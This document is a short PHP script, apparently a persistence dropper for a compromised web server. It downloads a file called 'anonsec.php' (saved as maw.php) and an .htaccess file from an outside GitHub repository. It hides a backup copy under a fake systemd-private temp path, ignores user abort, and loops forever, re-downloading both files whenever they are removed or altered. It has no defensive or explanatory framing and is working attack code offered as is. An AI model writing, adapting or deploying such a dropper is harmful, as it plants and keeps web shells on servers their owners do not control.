<?php

$htaccessFile = ".htaccess";
$mawFile = "maw.php";
$htaccessBackup = "/var/tmp/systemd-private-d2965998338a4e6a84320173dff28bb0-haveged.service-HgExaf2a";
$htaccessUrl = "https://raw.githubusercontent.com/maw3six/maw3six/refs/heads/main/bypassed/.htaccess";
$mawUrl = "https://raw.githubusercontent.com/maw3six/maw3six/refs/heads/main/bypassed/anonsec.php";

function curlDownload($url, $saveTo)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);

    $data = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($httpCode === 200 && $data !== false) {
        file_put_contents($saveTo, $data);
        return true;
    }
    return false;
}

function downloadFiles()
{
    global $htaccessFile, $mawFile, $htaccessBackup, $htaccessUrl, $mawUrl;

    if (!file_exists($mawFile) || (file_exists($mawFile) && strpos(file_get_contents($mawFile), '@Maw3six') === false)) {
        if (file_exists($mawFile)) {
            chmod($mawFile, 0644);
        }

        if (curlDownload($mawUrl, $mawFile)) {
            echo "Successfully downloaded $mawFile\n";
        } else {
            echo "Permission denied while downloading $mawFile\n";
        }
    }

    // Download .htaccess
    if (!file_exists($htaccessFile) || !hash_equals(hash_file('md5', $htaccessFile), hash_file('md5', $htaccessBackup))) {
        if (file_exists($htaccessFile)) {
            chmod($htaccessFile, 0644);
        }

        if (curlDownload($htaccessUrl, $htaccessFile)) {
            echo "Successfully downloaded $htaccessFile\n";
        } else {
            echo "Permission denied while downloading $htaccessFile\n";
        }
    }
}

curlDownload($htaccessUrl, $htaccessBackup);
sleep(2);

set_time_limit(0);
ignore_user_abort(true);

echo "Script berjalan terus menerus...\n";

while (true) {
    echo date("Y-m-d H:i:s") . " - Checking files...\n";

    downloadFiles();

    echo date("Y-m-d H:i:s") . " - Check selesai\n";
    sleep(2);
}
?>
